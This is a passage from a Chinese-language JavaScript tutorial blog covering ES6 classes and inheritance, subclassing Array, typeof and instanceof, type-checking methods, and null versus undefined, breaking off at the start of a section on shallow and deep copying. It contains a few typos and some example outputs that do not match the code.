<h3 id="ES6-Class继承"><a href="#ES6-Class继承" class="headerlink" title="ES6 Class继承"></a>ES6 Class继承</h3><h4 id="类的申明"><a href="#类的申明" class="headerlink" title="类的申明"></a>类的申明</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> methodName = <span class="string">'info'</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(name, email) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.email = email</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 普通方法：只能通过实例来调用</span></span><br><span class="line">  <span class="comment">// 也可以通过计算属性来定义</span></span><br><span class="line">  <span class="comment">// [methodName]() &#123;</span></span><br><span class="line">  info() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Hi, I'm <span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span>, my email is <span class="subst">$&#123;<span class="keyword">this</span>.email&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 静态方法：只通过类来调用，不能通过实例来调用</span></span><br><span class="line">  <span class="comment">// 类似于Array.from()方法，只能在Array原型上调用，而push方法可以在new Array()实例上调用</span></span><br><span class="line">  <span class="keyword">static</span> description() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'I\'m a description'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set github(value) &#123;</span><br><span class="line">    <span class="keyword">this</span>.githubName = value</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  get github() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`https://github.com/<span class="subst">$&#123;<span class="keyword">this</span>.githubName&#125;</span>`</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化</span></span><br><span class="line"><span class="keyword">const</span> codecasts = <span class="keyword">new</span> User(<span class="string">'codecasts'</span>, <span class="string">'111@codecasts.com'</span>);</span><br><span class="line"><span class="keyword">const</span> awesome = <span class="keyword">new</span> User(<span class="string">'awesome'</span>, <span class="string">'999@awesome.com'</span>);</span><br><span class="line"></span><br><span class="line">codecasts.github = <span class="string">'Pimi'</span></span><br><span class="line"><span class="built_in">console</span>.log(codecasts.github) <span class="comment">// https://github.com/Pimi</span></span><br></pre></td></tr></table></figure>
<h4 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(name) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">    <span class="keyword">this</span>.belly = []</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  eat(food) &#123;</span><br><span class="line">    <span class="keyword">this</span>.belly.push(food)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  speak() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Hi, I'm <span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(name, age) &#123;</span><br><span class="line">    <span class="keyword">super</span>() <span class="comment">// 非常重要</span></span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">    <span class="keyword">this</span>.age = age</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bark() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Bark bark'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 子类重写，会覆盖父类的方法</span></span><br><span class="line">  speak() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Bark bark, Hi, I'm <span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> lucky = <span class="keyword">new</span> Dog(<span class="string">'lucky'</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<h3 id="扩建Array"><a href="#扩建Array" class="headerlink" title="扩建Array"></a>扩建Array</h3><p>定义一个myArray类，完全继承Array<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myArray</span> <span class="keyword">extends</span> <span class="title">Array</span></span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">super</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> colors = <span class="keyword">new</span> myArray()</span><br><span class="line"></span><br><span class="line">colors[<span class="number">0</span>] = <span class="string">'red'</span></span><br><span class="line"><span class="built_in">console</span>.log(colors.length)</span><br><span class="line"></span><br><span class="line">colors.length = <span class="number">0</span></span><br><span class="line"><span class="built_in">console</span>.log(colors[<span class="number">0</span>])</span><br></pre></td></tr></table></figure></p>
<p>基于 <code>Array</code> 实现一个 <code>MoviewCollection</code>，第一个参数为一个特殊描述，后续为不定个数的统一数据结构的对象<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> movies = <span class="keyword">new</span> MoviewCollection(<span class="string">'favorite movies'</span>,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'The Croolds'</span>, <span class="attr">scores</span>: <span class="number">8.7</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'The Shawshank Redemption'</span>, <span class="attr">scores</span>: <span class="number">9.6</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'Leon'</span>, <span class="attr">scores</span>: <span class="number">9.4</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'Days of Summer'</span>, <span class="attr">scores</span>: <span class="number">8.0</span> &#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>实现：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MoviesCollection</span> <span class="keyword">extends</span> <span class="title">Array</span></span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(desc, ...items) &#123;</span><br><span class="line">    <span class="keyword">super</span>(...items) <span class="comment">// this指向的是实例</span></span><br><span class="line">    <span class="keyword">this</span>.desc = desc</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  add(movie) &#123;</span><br><span class="line">    <span class="keyword">this</span>.push(movie)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> movies = <span class="keyword">new</span> MoviesCollection(<span class="string">'favorite movies'</span>,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'The Croolds'</span>, <span class="attr">scores</span>: <span class="number">8.7</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'The Shawshank Redemption'</span>, <span class="attr">scores</span>: <span class="number">9.6</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">'Leon'</span>, <span class="attr">scores</span>: <span class="number">9.4</span> &#125;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">movies.push(&#123; <span class="attr">name</span>: <span class="string">'Last Day'</span>, <span class="attr">scores</span>: <span class="number">7.0</span> &#125;)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[</span></span><br><span class="line"><span class="comment">  &#123;name: "The Croolds", scores: 8.7&#125;,</span></span><br><span class="line"><span class="comment">  &#123;name: "The Shawshank Redemption", scores: 9.6&#125;,</span></span><br><span class="line"><span class="comment">  &#123;name: "Leon", scores: 9.4&#125;,</span></span><br><span class="line"><span class="comment">  &#123;name: "Last Day", scores: 9&#125;,</span></span><br><span class="line"><span class="comment">  desc: "favorite movies"</span></span><br><span class="line"><span class="comment">]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p>
<p>此外，我们还可以在子类中添加一个 <code>TopRated</code> 的方法，在 <code>add</code> 后面添加：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// limit表示取前几项排序</span></span><br><span class="line">topRated(limit = <span class="number">10</span>) &#123;</span><br><span class="line">  <span class="comment">// 升序</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a.scores - b.scores).slice(<span class="number">0</span>, limit)</span><br><span class="line">  <span class="comment">// return this.sort((a, b) =&gt; (a.scores &gt; b.scores) ? 1 : -1).slice(0, limit)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 降序</span></span><br><span class="line">  <span class="comment">// return this.sort((a, b) =&gt; b.scores - a.scores).slice(0, limit)</span></span><br><span class="line">  <span class="comment">// return this.sort((a, b) =&gt; (b.scores &gt; a.scores) ? 1 : -1).slice(0, limit)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">movies.topRate()</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[</span></span><br><span class="line"><span class="comment">  &#123;name: "The Croolds", scores: 8.7&#125;,</span></span><br><span class="line"><span class="comment">  &#123;name: "Last Day", scores: 9&#125;,</span></span><br><span class="line"><span class="comment">  &#123;name: "Leon", scores: 9.4&#125;,</span></span><br><span class="line"><span class="comment">  &#123;name: "The Shawshank Redemption", scores: 9.6&#125;,</span></span><br><span class="line"><span class="comment">  desc: 4</span></span><br><span class="line"><span class="comment">]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="typeof-和-instanceof"><a href="#typeof-和-instanceof" class="headerlink" title="typeof 和 instanceof"></a>typeof 和 instanceof</h2><p>JavaScript常使用 <code>typeof</code> 和 <code>instanceof</code> 来判断一个变量是否为空或者是什么类型。</p>
<h3 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h3><p>  typeof的定义和用法：返回值是一个字符串，用来说明变量的数据类型。</p>
<ol>
<li><code>typeof</code> 一般返回：<code>undefined</code>、<code>boolean</code>、<code>string</code>、<code>number</code>、<code>function</code>、<code>object</code>，注意不等同于js的基本类型<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>; <span class="comment">// 'undefined'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">true</span>; <span class="comment">// 'boolean'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="string">'abc'</span>; <span class="comment">// 'string'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="number">123</span>; <span class="comment">// 'number'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>; <span class="comment">// 'object'</span></span><br><span class="line"><span class="keyword">typeof</span> []; <span class="comment">// 'object'</span></span><br><span class="line"><span class="keyword">typeof</span> &#123;&#125;; <span class="comment">// 'object'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="built_in">Set</span>(); <span class="comment">// 'object'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="built_in">Map</span>(); <span class="comment">// 'object'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">Object</span>; <span class="comment">// 'funciton'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">Array</span>; <span class="comment">// 'function'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;; <span class="comment">// 'function'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">console</span>.log; <span class="comment">// 'function'</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol start="2">
<li><p>获取一个变量是否存在</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> a !== <span class="string">'undefined'</span>) &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>而不要使用</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (a) &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>a如果不存在（未申明）时会报错。</p>
</li>
<li><p>对于 <code>Array</code>, <code>Null</code> 等特殊对象使用 <code>typeof</code> 一律返回 <code>object</code>，这正是 <code>typeof</code> 的局限性，可以借助 <code>instanceof</code></p>
</li>
</ol>
<h3 id="instanceOf"><a href="#instanceOf" class="headerlink" title="instanceOf"></a>instanceOf</h3><p>  instanceof定义和用法：<code>instanceof</code> 用于判断一个变量是否属于某个对象的实例。<br>  注：不能检测 <code>null</code> 和 <code>undefined</code>。</p>
  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a <span class="keyword">instanceof</span> b; <span class="comment">// a是b的实例</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>(); </span><br><span class="line"><span class="built_in">console</span>.log(a <span class="keyword">instanceof</span> <span class="built_in">Array</span>);  <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(a <span class="keyword">instanceof</span> <span class="built_in">Object</span>);  <span class="comment">// true，因为数组是对象的实例</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">'123'</span></span><br><span class="line"><span class="built_in">console</span>.log(a <span class="keyword">instanceof</span> <span class="built_in">String</span>) <span class="comment">// false</span></span><br><span class="line"><span class="comment">// 虽然类型为string，但是并不是String对象，没有创建实例</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="built_in">String</span>()</span><br><span class="line"><span class="built_in">console</span>.log(b <span class="keyword">instanceof</span> <span class="built_in">String</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 拓展：</span></span><br><span class="line"><span class="keyword">var</span> str1 = <span class="string">'123'</span></span><br><span class="line"><span class="keyword">var</span> str2 = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">'123'</span>) <span class="comment">// String &#123;"123"&#125;</span></span><br><span class="line"><span class="keyword">var</span> str3 = <span class="built_in">String</span>(<span class="string">'123'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> str1) <span class="comment">// 'string', 基本类型</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> str2) <span class="comment">// 'object', 引用类型</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> str3) <span class="comment">// 'string', 基本类型</span></span><br><span class="line"><span class="built_in">console</span>.log(str1 === str2) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(str1 === str3) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> test(); <span class="comment">// a是一个实例</span></span><br><span class="line"><span class="built_in">console</span>.log(a <span class="keyword">instanceof</span> test); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">null</span> <span class="keyword">instanceof</span> Null; <span class="comment">// Uncaught ReferenceError: Null is not defined</span></span><br><span class="line"><span class="literal">undefined</span> <span class="keyword">instanceof</span> Undefined; <span class="comment">// Uncaught ReferenceError: Undefined is not defined</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="js检测一个变量是String类型"><a href="#js检测一个变量是String类型" class="headerlink" title="js检测一个变量是String类型"></a>js检测一个变量是String类型</h2><ol>
<li><p>es5方法</p>
<ul>
<li><p>方法1：typeof</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isString</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">typeof</span> str === <span class="string">'string'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法2：constructor</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isString</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// return str.constructor === String;</span></span><br><span class="line">  <span class="keyword">return</span> str.__proto__.constructor === <span class="built_in">String</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法3：Object.prototype.toString.call</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isString</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(str) === <span class="string">'[object String]'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拓展：</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="number">1</span>); <span class="comment">// '[object Number]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="string">''</span>); <span class="comment">// '[object String]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call([]); <span class="comment">// '[object Array]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(&#123;&#125;); <span class="comment">// '[object Object]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">true</span>); <span class="comment">// '[object Boolean]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">null</span>); <span class="comment">// '[object Null]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">undefined</span>); <span class="comment">// '[object Undefined]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;); <span class="comment">// '[object Function]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="keyword">new</span> <span class="built_in">Date</span>()); <span class="comment">// '[object Date]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="keyword">new</span> <span class="built_in">RegExp</span>()); <span class="comment">// '[object RegExp]'</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="keyword">new</span> <span class="built_in">Error</span>()); <span class="comment">// '[object Error]'</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<hr>
<h2 id="js检测一个变量是Array类型"><a href="#js检测一个变量是Array类型" class="headerlink" title="js检测一个变量是Array类型"></a>js检测一个变量是Array类型</h2><ol>
<li><p>es5方式</p>
<ul>
<li><p>方法1：instanceof</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isArray</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr <span class="keyword">instanceof</span> <span class="built_in">Array</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法2：constrctor</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isArray</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// return arr.constructor === Array;</span></span><br><span class="line">  <span class="keyword">return</span> arr.__proto__.constructor === <span class="built_in">Array</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法3：Object.prototype.toString.call（推荐使用此方法）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isArray</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(arr) === <span class="string">'[object Array]'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法4：Object.getPrototypeOf()</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isArray</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.getPrototypeOf(arr) === <span class="built_in">Array</span>.prototype;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法5：Array.prototype.isPrototypeOf()</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isArray</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.prototype.isPrototypeOf(arr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>注：实际上，除了 <code>Object.prototype.toString.call</code> 这个方法，其余的方法并不绝对正确。如下，使用其他四种方法输出的都是 <code>true</code>：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  __proto__: <span class="built_in">Array</span>.prototype</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我们只是手动指定了某个对象的 <code>__proto__</code> 属性为 <code>Array.prototype</code>，便导致了该对象继承了 <code>Array</code> 对象，这种毫不负责任的继承方式，使得基于继承的判断方案瞬间土崩瓦解。</p>
<blockquote>
<p>参考：<a href="https://www.jianshu.com/p/602de7ce76e7" target="_blank" rel="noopener">简书 判断变量是否为数组</a></p>
</blockquote>
</li>
<li><p>es6方式</p>
<ul>
<li>方法1：isArray方法<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isArray</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.isArray(arr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<hr>
<h2 id="null-和-undefined的区别"><a href="#null-和-undefined的区别" class="headerlink" title="null 和 undefined的区别"></a>null 和 undefined的区别</h2><ol>
<li><p>实例</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="literal">null</span> == <span class="literal">undefined</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="literal">null</span> === <span class="literal">undefined</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>定义：</p>
<ul>
<li>null: Null类型，代表“空值”，代表一个空对象指针，不指向任何对象地址。</li>
<li>undefined: Undefined类型，当一个声明了一个变量未初始化时，得到的就是 <code>undefined</code>。</li>
</ul>
</li>
<li><p>何时使用 <code>null</code> ?<br>当使用完一个比较大的对象时，需要对其进行释放内存时，设置为null，这样方便垃圾回收。</p>
</li>
</ol>
<hr>
<h2 id="js浅拷贝和深拷贝（针对引用类型数据Object）"><a href="#js浅拷贝和深拷贝（针对引用类型数据Object）" class="headerlink" title="js浅拷贝和深拷贝（针对引用类型数据Object）"></a>js浅拷贝和深拷贝（针对引用类型数据Object）</h2><ol>
<li><p>浅拷贝：重新在堆内存中开辟一个空间，拷贝后新对象获得独立的基本数据类型数据，和原对象共用引用类型数据。<br><strong>浅拷贝的表现</strong>：</p>
